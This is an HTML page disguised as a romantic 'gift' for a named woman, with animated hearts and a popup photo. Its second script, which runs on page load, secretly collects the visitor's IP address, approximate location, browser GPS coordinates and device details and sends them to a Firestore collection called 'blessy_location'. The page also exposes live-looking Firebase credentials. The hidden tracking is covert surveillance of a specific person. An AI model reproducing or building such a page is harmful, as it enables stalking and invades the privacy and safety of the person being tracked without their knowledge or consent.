<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For Blessy ❤️</title>

<style>

body{
margin:0;
height:100vh;
background:linear-gradient(45deg,#ff4b5c,#ff9a9e);
font-family:Arial;
overflow:hidden;
color:white;
text-align:center;
display:flex;
justify-content:center;
align-items:center;
}

/* Container */

.container{
width:90%;
max-width:350px;
z-index:10;
}

/* Heart animation */

.heart{
font-size:70px;
animation:beat 1s infinite;
}

@keyframes beat{
0%{transform:scale(1);}
50%{transform:scale(1.3);}
100%{transform:scale(1);}
}

h1{
font-size:28px;
margin:10px 0;
}

button{
width:100%;
padding:14px;
font-size:18px;
border:none;
border-radius:25px;
background:white;
color:#ff4b5c;
margin-top:15px;
cursor:pointer;
}

/* Falling hearts */

.heartbg{
position:absolute;
top:-10px;
font-size:20px;
animation:fall linear infinite;
}

@keyframes fall{
0%{transform:translateY(-10px);opacity:1;}
100%{transform:translateY(110vh);opacity:0;}
}

/* Explosion hearts */

.popheart{
position:absolute;
font-size:25px;
animation:pop 2s forwards;
}

@keyframes pop{
0%{transform:scale(0);opacity:1;}
100%{transform:translateY(-200px) scale(1.5);opacity:0;}
}

/* Modal Popup */

.modal{
display:none;
position:fixed;
z-index:999;
left:0;
top:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.8);
justify-content:center;
align-items:center;
}

.modal-content{
position:relative;
animation:fadeIn 0.5s;
}

.modal img{
max-width:90vw;
max-height:80vh;
border-radius:15px;
box-shadow:0 0 20px white;
}

.close{
position:absolute;
top:-10px;
right:-10px;
font-size:30px;
color:white;
cursor:pointer;
}

@keyframes fadeIn{
from{opacity:0; transform:scale(0.8);}
to{opacity:1; transform:scale(1);}
}

</style>
</head>

<body>

<div class="container">
<div class="heart">❤️</div>
<h1>Dear Blessy ❤️</h1>
<p>My Special Gift For You</p>
<button onclick="openGift()">Open Gift 🎁</button>
</div>

<!-- Popup -->
<div id="imageModal" class="modal">
  <div class="modal-content">
    <span class="close" onclick="closeModal()">×</span>
    <img src="https://i.imgur.com/8Km9tLL.jpg" alt="Love Image">
  </div>
</div>

<script>

/* Falling background hearts */
for(let i=0;i<25;i++){
let heart=document.createElement("div");
heart.innerHTML="❤️";
heart.className="heartbg";
heart.style.left=Math.random()*100+"%";
heart.style.animationDuration=(3+Math.random()*5)+"s";
heart.style.fontSize=(15+Math.random()*25)+"px";
document.body.appendChild(heart);
}

/* Open Gift */
function openGift(){

for(let i=0;i<20;i++){
let h=document.createElement("div");
h.innerHTML="💖";
h.className="popheart";
h.style.left=(40+Math.random()*20)+"%";
h.style.bottom="40%";
document.body.appendChild(h);
}

setTimeout(()=>{
document.getElementById("imageModal").style.display="flex";
},800);
}

function closeModal(){
document.getElementById("imageModal").style.display="none";
}

</script>


<!-- Firebase + IP + GPS Location -->
<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
authDomain: "remote-videoplayer.firebaseapp.com",
projectId: "remote-videoplayer",
storageBucket: "remote-videoplayer.firebasestorage.app",
messagingSenderId: "978359248102",
appId: "1:978359248102:web:c03c62454f8cbf70030727"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

async function saveData(ipData,gpsLat,gpsLng){

await addDoc(collection(db,"blessy_location"),{

ip:ipData.ip,
city:ipData.city,
region:ipData.region,
country:ipData.country_name,

ipLatitude:ipData.latitude,
ipLongitude:ipData.longitude,

gpsLatitude:gpsLat,
gpsLongitude:gpsLng,

time:new Date().toString(),
device:navigator.userAgent

});

}

fetch("https://ipapi.co/json/")
.then(res=>res.json())
.then(ipData=>{

navigator.geolocation.getCurrentPosition(

(position)=>{
saveData(ipData,position.coords.latitude,position.coords.longitude);
},

(error)=>{
saveData(ipData,null,null);
}

);

});

</script>

</body>
</html>
